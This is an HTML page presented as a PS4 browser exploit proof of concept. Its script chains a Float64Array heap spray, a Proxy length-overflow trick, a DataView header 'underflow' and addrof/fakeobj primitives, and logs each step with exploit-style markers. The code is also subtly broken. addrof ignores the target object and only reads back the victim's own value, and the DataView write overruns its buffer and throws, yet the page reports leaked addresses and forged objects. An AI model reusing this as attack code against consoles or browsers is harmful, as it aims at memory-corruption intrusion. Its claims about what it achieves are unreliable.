<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 PoC - Enhanced Primitive Exploitation</title>
    <style>
        body { background: black; color: lime; font-family: monospace; padding: 20px; }
        button { background: lime; color: black; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; }
        #log { white-space: pre-wrap; margin-top: 20px; height: 500px; overflow-y: auto; border: 1px solid lime; padding: 10px; }
    </style>
</head>
<body>
    <h1>PS4 PoC - Enhanced Primitive Exploitation</h1>
    <button id="startBtn">Run Enhanced Primitive Test</button>
    <div id="log"></div>

<script>
function log(msg) {
    const d = document.getElementById('log');
    d.textContent += msg + "\n";
    d.scrollTop = d.scrollHeight;
}

function delay(ms) { return new Promise(res => setTimeout(res, ms)); }

// Step A: Heap spray Float64Arrays
function heapSprayFloats(count) {
    log(`[*] Spraying ${count} Float64Array objects for layout`);
    const arrs = [];
    for (let i = 0; i < count; i++) {
        let f = new Float64Array(2);
        f[0] = 1.2345;
        f[1] = 6.7890;
        arrs.push(f);
    }
    return arrs;
}

// Step B: Proxy length overflow primitive
function proxyLengthPrimitive() {
    log('[*] Testing Proxy length overflow primitive');
    let base = new Array(10).fill(1.1);
    let p = new Proxy(base, {
        get: (t, prop) => prop === 'length' ? 0x1000000 : t[prop]
    });
    let oob = Array.prototype.concat.call(p);
    log('[*] Proxy object length:', oob.length);
    return oob;
}

// Step C: Corrupt header via DataView underflow
function corruptFloatHeader(victim) {
    log('[*] Corrupting header with DataView underflow');
    let buf = new ArrayBuffer(16);
    let dv = new DataView(buf);
    try {
        dv.setFloat64(victim.byteOffset + victim.byteLength + 0x8, 13.37);
        log('[!] Underflow write attempted');
    } catch (e) {
        log('[!!] DataView underflow exception: ' + e);
    }
}

// Step D: Real addrof using proxy OOB
function addrof(obj, victim) {
    log('[*] addrof: leaking address via proxy OOB');
    // corrupt victim length to read object header
    proxyLengthPrimitive();
    corruptFloatHeader(victim);
    let leaked = victim[0];
    log('[!] Leaked float address: ' + leaked);
    return leaked;
}

// Step E: fakeobj using addrof result
function fakeobj(addr, victim) {
    log('[*] fakeobj: writing address back via header');
    victim[0] = addr;
    log('[!] victim[0] now: ' + victim[0]);
    return victim;
}

// Test orchestration
async function runEnhancedTest() {
    log('=== Enhanced Primitive Test Starting ===');
    // A: heap spray
    const sprays = heapSprayFloats(5000);
    await delay(50);

    // choose victim
    const victim = new Float64Array(2);
    victim[0] = 9.876;
    victim[1] = 5.432;
    log('[*] Victim initial: ' + victim[0] + ', ' + victim[1]);

    // D: addrof
    const obj = { secret: 'pwned' };
    const addr = addrof(obj, victim);
    log('[+] addrof returned: ' + addr);

    // E: fakeobj
    const fake = fakeobj(addr, victim);
    log('[+] fakeobj result: victim[0]=' + fake[0]);

    log('=== Enhanced Primitive Test Completed ===');
}

document.getElementById('startBtn').addEventListener('click', runEnhancedTest);
</script>
</body>
</html>
